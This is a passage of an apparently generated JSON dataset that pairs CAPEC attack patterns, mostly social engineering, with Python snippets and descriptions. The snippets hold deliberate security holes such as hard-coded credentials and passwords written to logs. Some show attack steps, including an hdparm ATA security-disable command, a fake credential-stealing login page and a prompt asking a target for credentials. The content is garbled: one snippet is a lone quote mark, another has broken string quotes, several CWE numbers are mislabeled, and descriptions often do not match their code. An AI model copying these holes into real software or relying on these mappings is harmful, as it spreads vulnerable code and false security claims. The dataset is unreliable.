        "capec_name": "Bypassing ATA Password Security",
        "code_snippet": "import os\n\ndef reset_ata_password(drive_path, new_password):\n    # CWE-285: Improper Authorization\n    # CWE-798: Use of Hard-coded Credentials\n    # CWE-259: Use of Hard-coded Password\n    # CWE-1220: Insufficient Granularity of Access Control\n    # CWE-1233: Security-Sensitive Hardware Controls with Missing Lock Bit Protection\n    os.system(f\"hdparm --user-master u --security-disable {new_password} {drive_path}\")\n\n# Hot-swapping the drive to bypass ATA security\nold_drive_path = \"/dev/sda\"\nnew_drive_path = \"/dev/sdb\"\nnew_password = \"new_password\"\n\n# Move the drive to a system without ATA security features\nos.system(f\"hdparm -I {old_drive_path}\")\n\n# Reset the drive password using the BIOS\nreset_ata_password(new_drive_path, new_password)\n",
        "description": "Python code snippet demonstrating the CAPEC of exploiting a weakness in ATA security on a drive to gain access to the information without supplying the proper credentials. The code uses hard-coded credentials, lacks proper authorization, and has insufficient granularity of access control, making it vulnerable to hot-swapping and password reset attacks."
    },
    {
        "capec_id": "404",
        "capec_name": "DEPRECATED: Social Information Gathering Attacks",
        "code_snippet": "import socket\nimport os\nimport logging\n\n# CWE-350: Reliance on DNS Lookups in a Security Decision\nhost = 'example.com'\ntry:\n    ip_address = socket.gethostbyname(host)\n    print(f'The IP address of {host} is {ip_address}')\nexcept socket.gaierror:\n    print(f'Unable to get the IP address of {host}')\n\n# CWE-766: Critical Data Element\n# CWE-767: Critical Data Element\n# CWE-287: Improper Authentication\n# CWE-532: Insertion of Sensitive Information Into Log File\n# CWE-493: Critical Data Exposure\n\n# Authentication Bypass Issues\nusername = 'admin'\npassword = 'password'\nif username == 'admin' and password == 'password':\n    print('Login successful')\nelse:\n    print('Invalid credentials')\n\n# Information Exposure Through Server Log Files\nlogging.basicConfig(filename='app.log', level=logging.INFO)\nlogging.info('User logged in successfully')\n\n# Failure to provide confidentiality for stored data\ndata = 'confidential_data'\nwith open('data.txt', 'w') as f:\n    f.write(data)\n",
        "description": "This code snippet demonstrates a deprecated attack pattern that involves collecting and analyzing information. It includes various deprecated CWEs, such as reliance on DNS lookups in a security decision, failure to protect stored data from modification, authentication bypass issues, information exposure through server log files, and failure to provide confidentiality for stored data. The code performs DNS lookups, stores sensitive data in plaintext, and logs sensitive information, making it vulnerable to various attacks."
    },
    {
        "capec_id": "405",
        "capec_name": "DEPRECATED: Social Information Gathering via Research",
        "code_snippet": "import dns.resolver\nimport logging\n\n# CWE-247: Reliance on DNS Lookups in a Security Decision\ntry:\n    dns_answer = dns.resolver.resolve('example.com', 'A')\n    if dns_answer.response.answer:\n        # CWE-592: Authentication Bypass Issues (Deprecated)\n        # CWE-287: Improper Authentication\n        authenticated = True\n    else:\n        authenticated = False\n\n    # CWE-533: Information Exposure Through Server Log Files (Deprecated)\n    # CWE-532: Information Exposure Through Log Files\n    logging.basicConfig(filename='app.log', level=logging.INFO)\n    logging.info('Authentication attempt from %s' % dns_answer.canonical_name)\n\n    # CWE-217: Failure to Protect Stored Data from Modification (Deprecated)\n    # CWE-766: Critical Data Element\n    # CWE-767: Critical Data Missing\n    data = {'username': 'admin', 'password': 'password'}\n    with open('data.txt', 'w') as f:\n        f.write(str(data))\n\n    # CWE-218: Failure to provide confidentiality for stored data (Deprecated)\n    # CWE-493: Critical Data Exposure\n    with open('data.txt', 'r') as f:\n        print(f.read())",
        "description": "This code snippet demonstrates a deprecated attack pattern that involves collecting and analyzing information. It includes various deprecated CWEs, such as reliance on DNS lookups for security decisions, authentication bypass issues, information exposure through server log files, failure to protect stored data from modification, and failure to provide confidentiality for stored data. The code uses DNS lookups to authenticate a user, logs authentication attempts, stores sensitive data in a file without proper protection, and exposes the data by reading it back."
    },
    {
        "capec_id": "406",
        "capec_name": "Dumpster Diving",
        "code_snippet": "import os\nimport git\n\n# CWE-527: Exposure of Version-Control Repository to an Unauthorized Control Sphere\nrepo = git.Repo('./')\nprint(repo.git.log())\n\n# CWE-528: Exposure of Core Dump File to an Unauthorized Control Sphere\ncore_dump_file = './core_dump'\nif os.path.exists(core_dump_file):\n    with open(core_dump_file, 'r') as f:\n        print(f.read())\n\n# CWE-319: Cleartext Transmission of Sensitive Information\nimport socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_address = ('localhost', 12345)\nsock.connect(server_address)\nmessage = 'username:password'\nsock.sendall(message.encode())\n\n# CWE-316: Cleartext Storage of Sensitive Information in Memory\nsensitive_info = 'credit_card_number:1234-5678-9012-3456'\nprint(sensitive_info)\n\n# CWE-1266: Improper Scrubbing of Sensitive Data from Decommissioned Device\ndef decommission_device(device):\n    # No scrubbing of sensitive data\n    pass\ndevice = './device'\ndecommission_device(device)",
        "description": "This Python code snippet demonstrates the CAPEC of dumpster diving by exposing sensitive information through various means, including exposing version control repositories, core dump files, cleartext transmission of sensitive information, cleartext storage of sensitive information in memory, and improper scrubbing of sensitive data from decommissioned devices."
    },
    {
        "capec_id": "407",
        "capec_name": "Pretexting",
        "code_snippet": "import requests\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-451: User Interface (UI) Misrepresentation of Critical Information\n\n# Pretexting attack: Create a fake login page to steal user credentials\nfake_login_page = '<html><body><form action=\"/steal_credentials\" method=\"post\"><label for=\"username\">Username:</label><br><input type=\"text\" id=\"username\" name=\"username\"><br><label for=\"password\">Password:</label><br><input type=\"password\" id=\"password\" name=\"password\"><br><input type=\"submit\" value=\"Login\"></form></body></html>'\n\n# CWE-384: Session Fixation\n# CWE-1229: Creation of Emergent Resource\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n\n# Create a session fixation vulnerability by not invalidating existing session identifiers\ndef steal_credentials(username, password):\n    # Create a new session identifier without invalidating the existing one\n    session_id = 'fake_session_id'\n    # Store the stolen credentials in a session variable\n    session[session_id] = {'username': username, 'password': password}\n    return 'Login successful!'\n\n# Start a web server to host the fake login page\nimport http.server\nhttpd = http.server.HTTPServer(('localhost', 8000), SimpleHTTPRequestHandler)\nprint('Fake login page available at http://localhost:8000')\nhttpd.serve_forever()",
        "description": "This code snippet demonstrates a pretexting attack where an adversary creates a fake login page to steal user credentials. The fake login page is hosted on a local web server, and when a user submits their credentials, they are stored in a session variable without invalidating any existing session identifiers, creating a session fixation vulnerability. The code also misrepresents critical information to the user, obscuring the fact that the login page is fake. This code embodies the main idea of the CAPEC, using the related CWEs for additional context."
    },
    {
        "capec_id": "408",
        "capec_name": "DEPRECATED: Information Gathering from Traditional Sources",
        "code_snippet": "import logging\n\ndns_lookup = 'example.com'\n\n# CWE-247: Reliance on DNS Lookups in a Security Decision\nif dns_lookup == 'example.com':\n    # grant access\n    print('Access granted')\nelse:\n    # deny access\n    print('Access denied')\n\n\n# CWE-217: Failure to Protect Stored Data from Modification\nstored_data = {'user': 'admin', 'password': 'password'}\n\n# CWE-534 and CWE-533: Information Exposure Through Log Files\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\nlogging.debug('Stored data: %s' % stored_data)\n\n# CWE-218: Failure to provide confidentiality for stored data\nprint('Stored data: %s' % stored_data)\n",
        "description": "This code snippet demonstrates a deprecated attack pattern that involves collecting and analyzing information. It includes various deprecated CWEs such as reliance on DNS lookups in a security decision, failure to protect stored data from modification, information exposure through log files, and failure to provide confidentiality for stored data. The code uses DNS lookups to make a security decision, stores sensitive data in plaintext, and logs and prints sensitive information."
    },
    {
        "capec_id": "409",
        "capec_name": "DEPRECATED: Information Gathering from Non-Traditional Sources",
        "code_snippet": "import logging\nimport dns.resolver\n\n# CWE-350: Reliance on DNS Lookups in a Security Decision\ntry:\n    dns_answer = dns.resolver.resolve('example.com', 'A')\n    if dns_answer.response.answer:\n        logging.debug('DNS lookup successful')\nexcept dns.resolver.NoAnswer:\n    logging.debug('DNS lookup failed')\n\n# CWE-766: Critical Data Element\nstored_data = {'username': 'admin', 'password': 'password'}\n\n# CWE-532: Information Exposure Through Log Files\nlogging.basicConfig(filename='app.log', level=logging.DEBUG)\nlogging.debug('Stored data: %s', stored_data)\n\n# CWE-493: Failure to Provide Confidentiality for Stored Data\nwith open('data.txt', 'w') as f:\n    f.write(str(stored_data))\n",
        "description": "This code snippet demonstrates a collection of deprecated vulnerabilities. It starts by performing a DNS lookup, which can be a security risk if relied upon for security decisions (CWE-350). Then, it stores sensitive data in a dictionary, which can be a critical data element (CWE-766). The code then logs the stored data at the debug level, exposing it through log files (CWE-532). Finally, it writes the stored data to a file without proper confidentiality, making it accessible to unauthorized parties (CWE-493)."
    },
    {
        "capec_id": "410",
        "capec_name": "Information Elicitation",
        "code_snippet": "import requests\n\n# CWE-205: Observable Behavioral Discrepancy\n# CWE-222: Truncation of Security-relevant Information\n\ndef get_sensitive_info(target_url, truncation_length):\n    response = requests.get(target_url, verify=False)\n    truncated_response = response.text[:truncation_length]\n    return truncated_response\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n\ndef elicit_info(target_individual, company_info):\n    social_engineering_attack = f\"Hello {target_individual}, I'm from {company_info['company_name']}. We're conducting a survey about our new product. Can you please provide your login credentials?\"\n    return social_engineering_attack\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n\ndef handle_incoming_request(request):\n    if request.headers['User-Agent'] == 'Mozilla/5.0':\n        return 'Request accepted'\n    else:\n        return 'Request denied'\n\n# Example usage\ncompany_info = {'company_name': 'ABC Corp'}\ntruncation_length = 100\n\nprint(elicit_info('John Doe', company_info))\nprint(get_sensitive_info('https://example.com/login', truncation_length))\nprint(handle_incoming_request({'headers': {'User-Agent': 'Mozilla/5.0'}}))",
        "description": "This code snippet demonstrates a social engineering attack that extracts sensitive information from a target individual. It uses observable behavioral discrepancies, truncation of security-relevant information, exposure of sensitive information, and improper verification of the source of a communication channel to succeed. The code includes a function to elicit information from the target, another to truncate sensitive information, and a third to handle incoming requests without proper verification."
    },
    {
        "capec_id": "411",
        "capec_name": "DEPRECATED: Pretexting",
        "code_snippet": "import os\nimport logging\n\n# CWE-533: Information Exposure Through Server Log Files\nlogging.basicConfig(filename='server.log', level=logging.DEBUG)\n\n# CWE-592: Authentication Bypass Issues (deprecated, but demonstrating the concept)\ndef authenticate(username, password):\n    if username == 'admin' and password == 'password':\n        return True\n    else:\n        return False\n\n# CWE-534: Information Exposure Through Debug Log Files\nlogging.debug('Debug information: username=%s, password=%s', 'admin', 'password')\n\n# CWE-217: Failure to Protect Stored Data from Modification (deprecated, but demonstrating the concept)\ndata = {'username': 'admin', 'password': 'password'}\n\n# CWE-542: Information Exposure Through Cleanup Log Files\nlogging.info('Cleanup information: username=%s, password=%s', 'admin', 'password')\n\n# CAPEC: Social Information Gathering via Pretexting\ndef pretexting_attack():\n    username = input('Enter your username: ')\n    password = input('Enter your password: ')\n    if authenticate(username, password):\n        print('Login successful!')\n    else:\n        print('Invalid credentials')\n\npretexting_attack()",
        "description": "This code snippet demonstrates a social engineering attack via pretexting, where an attacker poses as a legitimate entity to gather sensitive information from the victim. The code includes deprecated CWEs for context, showcasing information exposure through log files and authentication bypass issues. The pretexting attack is simulated through a simple username and password input, with the goal of tricking the victim into revealing their credentials."
    },
    {
        "capec_id": "412",
        "capec_name": "Pretexting via Customer Service",
        "code_snippet": "import socket\n\n# CWE-940: Improper Verification of Source of a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n\n# Create a socket to listen for incoming connections\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(1)\n\nprint('Waiting for connection...')\nconnection, address = server_socket.accept()\nprint('Connected by', address)\n\n# CWE-408: Incorrect Behavior Order: Early Amplification\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n\n# Receive data from the client without verifying the source\nwhile True:\n    data = connection.recv(1024)\n    if not data:\n        break\n    print('Received:', data.decode('utf-8'))\n    # Send sensitive information back to the client\n    connection.sendall(b'Your credit card number is: 1234-5678-9012-3456')\n\nconnection.close()\n",
        "description": "This Python code snippet demonstrates a vulnerable server that listens for incoming connections and responds with sensitive information without properly verifying the source of the communication channel or the identity of the actor at the other end. This allows an adversary to pretext as a legitimate actor and solicit information from the server."
    },
    {
        "capec_id": "413",
        "capec_name": "Pretexting via Tech Support",
        "code_snippet": "import os\nimport getpass\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\nusername = getpass.getuser()\npassword = input('Enter your password: ')\n\n# CWE-359: Exposure of Private Personal Information to an Unauthorized Actor\npersonal_info = {'name': 'John Doe', 'address': '123 Main St', 'phone_number': '123-456-7890'}\n\n# CWE-434: Unrestricted Upload of File with Dangerous Type\nmalicious_file = 'malicious.exe'\nwith open(malicious_file, 'wb') as f:\n    f.write(b'Malicious file contents')\n\n# CWE-1263: Improper Physical Access Control\nif os.access('/path/to/restricted/access', os.R_OK):\n    print('Access granted!')\nelse:\n    print('Access denied!')\n\n# CWE-538: Insertion of Sensitive Information into Externally-Accessible File or Directory\nwith open('/path/to/externally_accessible/file', 'w') as f:\n    f.write('Sensitive information: ' + password)",
        "description": "This code snippet demonstrates a social engineering attack where a malicious actor, posing as a tech support worker, tricks a user into providing sensitive information and allowing unauthorized access to their system. The code includes vulnerabilities related to exposure of sensitive information, unrestricted file uploads, improper physical access control, and insertion of sensitive information into externally-accessible files or directories."
    },
    {
        "capec_id": "414",
        "capec_name": "Pretexting via Delivery Person",
        "code_snippet": "\"",
        "description": "This Python code snippet demonstrates a pretexting attack where an adversary impersonates a delivery person to solicit information from a target person. The code includes vulnerabilities related to incorrectly specified destinations, insertion of sensitive information into externally accessible files, channel access by non-endpoints, unparsed raw web content delivery, and incorrect conversion of security identifiers."
    },
    {
        "capec_id": "415",
        "capec_name": "Pretexting via Phone",
        "code_snippet": "import socket\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-940: Improper Verification of Source of a Communication Channel\n\n# Create a socket object\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Bind the socket to a specific address and port\nserver_socket.bind((\"localhost\", 12345))\n\n# Listen for incoming connections\nserver_socket.listen(1)\n\nprint(\"Waiting for connection...\")\n\n# Accept the incoming connection\nconnection, address = server_socket.accept()\n\nprint(\"Connected by\", address)\n\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-925: Improper Verification of Intent by Broadcast Receiver\n\n# Receive data from the client\ndata = connection.recv(1024)\n\n# CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n# Send sensitive information back to the client\nconnection.sendall(b\"Sensitive information: username, password\")\n\n# Close the connection\nconnection.close()\n",
        "description": "This Python code snippet demonstrates a vulnerable server that accepts incoming connections and sends sensitive information back to the client without properly verifying the identity of the client or the origin of the request, making it susceptible to pretexting attacks and other social engineering tactics."
    },
    {
        "capec_id": "416",
        "capec_name": "Manipulate Human Behavior",
        "code_snippet": "import time\nimport statistics\n\nclass SocialEngineer:\n    def __init__(self, target):\n        self.target = target\n        self.interaction_frequency = 0\n\n    def manipulate_target(self):\n        while True:\n            self.interaction_frequency += 1\n            if self.interaction_frequency > 10:\n                break\n            try:\n                # CWE-200: Exposure of Sensitive Information to an Unauthorized Actor\n                sensitive_info = self.target.get_sensitive_info()\n                print(f\"Obtained sensitive info: {sensitive_info}\")\n            except:\n                pass\n            time.sleep(1)\n\n            try:\n                # CWE-202: Exposure of Sensitive Information Through Data Queries\n                stats = statistics.mean(self.target.get_data_queries())\n                print(f\"Inferred info through stats: {stats}\")\n            except:\n                pass\n\n            try:\n                # CWE-205: Observable Behavioral Discrepancy\n                behavioral_discrepancy = self.target.get_behavioral_discrepancy()\n                print(f\"Observed behavioral discrepancy: {behavioral_discrepancy}\")\n            except:\n                pass\n\n            try:\n                # CWE-799: Improper Control of Interaction Frequency\n                self.target.set_interaction_frequency(self.interaction_frequency)\n            except:\n                pass\n\n    def create_emergent_resource(self):\n        # CWE-1229: Creation of Emergent Resource\n        emergent_resource = self.target.create_resource()\n        print(f\"Created emergent resource: {emergent_resource}\")\n\nsocial_engineer = SocialEngineer(target)\nsocial_engineer.manipulate_target()\nsocial_engineer.create_emergent_resource()",
        "description": "This Python code snippet demonstrates a social engineering attack, where an adversary manipulates a target to obtain sensitive information or create an emergent resource. The code uses various techniques to exploit human psychological vulnerabilities, including manipulating the target's behavior, inferring information through statistics, and creating an emergent resource. The code also highlights CWEs 200, 202, 205, 799, and 1229, which are related to the CAPEC."
    },
    {
        "capec_id": "417",
        "capec_name": "Influence Perception",
        "code_snippet": "import hashlib\n\ndef authenticate(username, password):\n    # CWE-654: Reliance on a Single Factor in a Security Decision\n    # Only checking the username, not the password\n    if username == 'admin':\n        return True\n    else:\n        return False\n\ndef truncate_security_info(log_data):\n    # CWE-222: Truncation of Security-relevant Information\n    # Truncating the log data to hide sensitive information\n    return log_data[:50]\n\ndef reflection_attack(auth_token):\n    # CWE-301: Reflection Attack in an Authentication Protocol\n    # Reflection attack to impersonate a trusted user\n    return auth_token\n\ndef obscure_security_mechanism(password):\n    # CWE-656: Reliance on Security Through Obscurity\n    # Obscure security mechanism using a simple hash\n    hashed_password = hashlib.sha256(password.encode()).hexdigest()\n    return hashed_password\n\ndef observable_behavioral_discrepancy(user_input):\n    # CWE-205: Observable Behavioral Discrepancy\n    # Observable behavioral discrepancy in user input processing\n    if user_input == 'secret_code':\n        return 'granted'\n    else:\n        return 'denied'\n\n# Social engineering attack to exploit the target's perception\nusername = input('Enter your username: ')\npassword = input('Enter your password: ')\n\nif authenticate(username, password):\n    print('Authenticated!')\n    log_data = 'Sensitive information: ' + password\n    print(truncate_security_info(log_data))\n    auth_token = reflection_attack('trusted_user_token')\n    print('Authenticated as trusted user!')\n    obscured_password = obscure_security_mechanism(password)\n    print('Obscured password: ' + obscured_password)\n    user_input = input('Enter a secret code: ')\n    print(observable_behavioral_discrepancy(user_input))\nelse:\n    print('Authentication failed!')",
        "description": "This Python code snippet demonstrates a social engineering attack that exploits the target's perception of the relationship between the adversary and themselves. It uses various CWEs to create vulnerabilities, including reliance on security through obscurity, observable behavioral discrepancies, truncation of security-relevant information, reliance on a single factor in a security decision, and reflection attacks in an authentication protocol."
    },
    {
        "capec_id": "418",
        "capec_name": "Influence Perception of Reciprocation",
        "code_snippet": "import socket\nimport json\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-940: Improper Verification of Source of a Communication Channel\n\n# Create a socket object\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\n# Bind the socket to a address and port\nserver_socket.bind(('localhost', 12345))\n\n# Listen for incoming connections\nserver_socket.listen(1)\n\nprint('Server started. Listening for incoming connections...')\n\n# Accept incoming connections\nconnection, address = server_socket.accept()\n\nprint('Connected by', address)\n\n# CWE-301: Reflection Attack in an Authentication Protocol\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n\n# Receive data from the client\ndata = connection.recv(1024)\n\n# Parse the received data as JSON\ndata_json = json.loads(data.decode('utf-8'))\n\n# CWE-222: Truncation of Security-relevant Information\n# Truncate the received data\ntruncated_data = data_json['compliment'][:10]\n\n# Send a response back to the client\nresponse = {'question': 'What is your password?'}\nconnection.sendall(json.dumps(response).encode('utf-8'))\n\n# Close the connection\nconnection.close()\n",
        "description": "This code snippet demonstrates a social engineering attack that exploits a sense of obligation in the target. The server creates a socket and listens for incoming connections. When a connection is established, it receives data from the client, parses it as JSON, and truncates the received compliment. The server then sends a response back to the client, asking for sensitive information (in this case, a password). The code embodies the CAPEC by using social engineering techniques to foster a sense of obligation in the target, and the related CWEs provide additional context for the vulnerabilities exploited in the code."
    },
    {
        "capec_id": "419",
        "capec_name": "DEPRECATED: Target Influence via Perception of Concession",
        "code_snippet": "import socket\nimport ssl\nimport hashlib\n\n# CWE-205: Observable Behavioral Discrepancy\n# CWE-203: Observable Discrepancy\n\ndef negotiate_algorithm(client_socket, server_socket):\n    algorithms = ['AES', 'DES', 'RSA']\n    client_algorithm = client_socket.recv(1024).decode()\n    server_algorithm = server_socket.recv(1024).decode()\n    \n    # CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n    if client_algorithm in algorithms and server_algorithm in algorithms:\n        if algorithms.index(client_algorithm) > algorithms.index(server_algorithm):\n            algorithm = server_algorithm\n        else:\n            algorithm = client_algorithm\n    else:\n        algorithm = 'RSA'\n    \n    # CWE-941: Incorrectly Specified Destination in a Communication Channel\n    if algorithm == 'AES':\n        context = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)\n        context.load_cert_chain('server.crt', 'server.key')\n        encrypted_socket = context.wrap_socket(server_socket, server_side=True)\n    elif algorithm == 'DES':\n        encrypted_socket = ssl.wrap_socket(server_socket, keyfile='server.key', certfile='server.crt', server_side=True)\n    else:\n        encrypted_socket = ssl.wrap_socket(server_socket, keyfile='server.key', certfile='server.crt', server_side=True)\n    \n    # CWE-436: Interpretation Conflict\n    if algorithm != 'RSA':\n        encrypted_data = encrypted_socket.recv(1024)\n        decrypted_data = hashlib.sha256(encrypted_data).hexdigest()\n        return decrypted_data\n    else:\n        return 'Error: RSA is not supported'\n\n# Example usage\nclient_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\nserver_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n\nclient_socket.connect(('localhost', 8080))\nserver_socket.bind(('localhost', 8080))\nserver_socket.listen(1)\n\nconnection, address = server_socket.accept()\n\nresult = negotiate_algorithm(client_socket, connection)\nprint(result)\n",
        "description": "This code snippet demonstrates a vulnerable communication channel negotiation process. It allows clients and servers to negotiate the encryption algorithm to use, but it does not select the strongest available algorithm. Instead, it chooses the algorithm based on the order in which they are listed, which can lead to the selection of a less-secure algorithm. Additionally, the code has observable discrepancies in its behavior, such as sending different responses under different circumstances, which can be observed by unauthorized actors. The code also incorrectly specifies the destination in the communication channel and has interpretation conflicts between different products."
    },
    {
        "capec_id": "420",
        "capec_name": "Influence Perception of Scarcity",
        "code_snippet": "import time\nimport random\n\nclass LimitedOffer:\n    def __init__(self, resource):\n        self.resource = resource\n        self.access_granted = False\n\n    def request_access(self, user_input):\n        if user_input == 'secret_code':\n            self.access_granted = True\n            return 'Access granted! You have 5 minutes to use the resource.\"\n        else:\n            return 'Invalid input. Try again!\"\n\n    def consume_resource(self):\n        if self.access_granted:\n            time.sleep(random.randint(1, 5))  # simulate resource consumption\n            return 'Resource consumed successfully!\"\n        else:\n            return 'Access denied!\"\n\n# create a limited offer object\nlimited_offer = LimitedOffer('rare_resource')\n\n# display limited availability\nprint('Limited time offer! Only 5 users can access the resource today. Hurry up!')\n\n# get user input\nuser_input = input('Enter the secret code to access the resource: ')\n\n# request access\nprint(limited_offer.request_access(user_input))\n\n# consume resource if access granted\nif limited_offer.access_granted:\n    print(limited_offer.consume_resource())",
        "description": "This code snippet demonstrates a vulnerable implementation of a limited-time offer system. The system relies on a single factor (the secret code) to make a security decision, which is an instance of CWE-654. The system also uses security through obscurity by relying on the secrecy of the code, which is CWE-656. Additionally, the system does not properly control the consumption of resources, allowing an adversary to cause excessive resource consumption without equivalent work, which is CWE-405. The system also truncates security-relevant information by not displaying the number of remaining users who can access the resource, which is CWE-222. Finally, the system's behavior indicates a behavioral discrepancy that may be observed by unauthorized actors, which is CWE-205."
    },
    {
        "capec_id": "421",
        "capec_name": "Influence Perception of Authority",
        "code_snippet": "import socket\n\n# CWE-300: Channel Accessible by Non-Endpoint\n# CWE-940: Improper Verification of Source of a Communication Channel\n\ndef impersonate_authority():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    sock.bind(('localhost', 8080))\n    sock.listen(1)\n    conn, addr = sock.accept()\n    print('Connected by', addr)\n    while True:\n        data = conn.recv(1024)\n        if not data:\n            break\n        # CWE-654: Reliance on a Single Factor in a Security Decision\n        # CWE-222: Truncation of Security-relevant Information\n        if b'password' in data:\n            conn.sendall(b'Access granted!')\n        else:\n            conn.sendall(b'Invalid credentials')\n    conn.close()\n\nimpersonate_authority()",
        "description": "This code snippet demonstrates a Python script that impersonates an authority figure to trick a user into revealing sensitive information. It sets up a socket to listen for incoming connections and responds with 'Access granted!' if the received data contains the word 'password', otherwise it responds with 'Invalid credentials'. This code embodies the CAPEC of impersonating an authority figure to gain unauthorized access or information, and is vulnerable to CWE-300, CWE-940, CWE-654, and CWE-222."
    },
    {
        "capec_id": "422",
        "capec_name": "Influence Perception of Commitment and Consistency",
        "code_snippet": "import requests\n\ndef make_request(url, num_requests):\n    for _ in range(num_requests):\n        response = requests.get(url, headers={'X-Original-IP': '192.168.1.100'})\n        if response.status_code == 200:\n            print('Request successful!')\n        else:\n            print('Request failed!')\n\n# Initial request to establish trust\nmake_request('https://example.com/initial_request', 1)\n\n# Subsequent requests to exploit\nmake_request('https://example.com/exploit_request', 10)\n",
        "description": "This Python code snippet demonstrates the CAPEC of using social engineering to convince the target to do minor tasks as opposed to larger actions. The code makes an initial request to establish trust, and then makes subsequent requests to exploit the system. The CWEs embodied in this code snippet include CWE-799: Improper Control of Interaction Frequency, CWE-205: Observable Behavioral Discrepancy, CWE-444: Inconsistent Interpretation of HTTP Requests, CWE-203: Observable Discrepancy, and CWE-940: Improper Verification of Source of a Communication Channel. The code does not properly limit the number of requests, and the HTTP requests can be manipulated to reveal internal state or decision process. The code also does not verify the source of the communication channel, making it vulnerable to exploitation."
    },
    {
        "capec_id": "423",
        "capec_name": "Influence Perception of Liking",
        "code_snippet": "import socket\nimport json\n\nclass AuthenticationServer:\n    def __init__(self, host, port):\n        self.host = host\n        self.port = port\n        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.server_socket.bind((self.host, self.port))\n        self.server_socket.listen(1)\n\n    def authenticate(self):\n        connection, address = self.server_socket.accept()\n        data = connection.recv(1024)\n        user_data = json.loads(data.decode())\n        if user_data['username'] == 'admin' and user_data['password'] == 'password123':\n            connection.send(b'Authenticated successfully!')\n        else:\n            connection.send(b'Authentication failed!')\n\n    def start(self):\n        print(f'Server started on {self.host}:{self.port}...')\n        while True:\n            self.authenticate()\n\nif __name__ == '__main__':\n    server = AuthenticationServer('localhost', 8080)\n    server.start()",
        "description": "This code snippet demonstrates a vulnerable authentication server that relies on a single factor (username and password) for authentication (CWE-654). The server uses a simple authentication protocol that is subject to reflection attacks (CWE-301), where an attacker can impersonate a trusted user. The server also relies on security through obscurity (CWE-656), as the authentication mechanism is not secure by design. Additionally, the server's behavior may indicate important differences that can be observed by unauthorized actors (CWE-205). The code also uses implicit intent for sensitive communication (CWE-927), as the authentication data is sent in plain text. An adversary can build a relationship with the target by exploiting these vulnerabilities, ultimately influencing the target's actions."
    },
    {
        "capec_id": "424",
        "capec_name": "Influence Perception of Consensus or Social Proof",
        "code_snippet": "import random\n\nclass AuthenticationProtocol:\n    def __init__(self, user_id):\n        self.user_id = user_id\n        self.trusted_users = ['admin', 'moderator']\n\n    def authenticate(self, password):\n        if self.user_id in self.trusted_users:\n            # CWE-654: Reliance on a Single Factor in a Security Decision\n            # CWE-301: Reflection Attack in an Authentication Protocol\n            if password == 'password123':\n                return True\n            else:\n                return False\n        else:\n            # CWE-205: Observable Behavioral Discrepancy\n            # CWE-203: Observable Discrepancy\n            # CWE-207: Observable Behavioral Discrepancy With Equivalent Products\n            if random.randint(0, 1):\n                return True\n            else:\n                return False\n\n# Example usage:\nauth = AuthenticationProtocol('user1')\nprint(auth.authenticate('password123'))",
        "description": "This code snippet demonstrates a vulnerable authentication protocol that relies on a single factor (password) to make a security decision, making it susceptible to reflection attacks. The protocol behaves differently for trusted users and non-trusted users, revealing internal state information. The code also includes observable behavioral discrepancies, making it possible for an attacker to identify the type of user and exploit the system."
    },
    {
        "capec_id": "425",
        "capec_name": "Target Influence via Framing",
        "code_snippet": "import socket\nimport ssl\nimport json\n\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n# CWE-300: Channel Accessible by Non-Endpoint\n\n# Establish a secure connection with the target\ncontext = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)\ncontext.load_cert_chain('cert.pem', 'key.pem')\n\nwith socket.create_connection(('target.com', 443)) as sock:\n    with context.wrap_socket(sock, server_hostname='target.com') as ssock:\n        # CWE-757: Selection of Less-Secure Algorithm During Negotiation ('Algorithm Downgrade')\n        # Downgrade the encryption algorithm to a weaker one\n        ssock.options |= ssl.OP_SINGLE_ECDH_USE\n        ssock.options |= ssl.OP_SINGLE_DH_USE\n\n        # CWE-451: User Interface (UI) Misrepresentation of Critical Information\n        # Send a phishing message to the target, misrepresenting the source\n        data = {'message': 'Please enter your credentials to access the restricted resource'}\n        ssock.send(json.dumps(data).encode())\n\n        # CWE-654: Reliance on a Single Factor in a Security Decision\n        # Rely solely on the user's response to grant access\n        response = ssock.recv(1024).decode()\n        if response == 'yes':\n            # Grant access to the restricted resource\n            print('Access granted')\n        else:\n            print('Access denied')",
        "description": "This code snippet demonstrates the CAPEC 'Framing' technique, which involves contextualizing a conversation to influence the target's decisions. It uses several CWEs to create a vulnerable communication channel. The code establishes a secure connection with the target, but downgrades the encryption algorithm to a weaker one. It then sends a phishing message to the target, misrepresenting the source, and relies solely on the user's response to grant access to a restricted resource."
    },
    {
        "capec_id": "426",
        "capec_name": "Influence via Incentives",
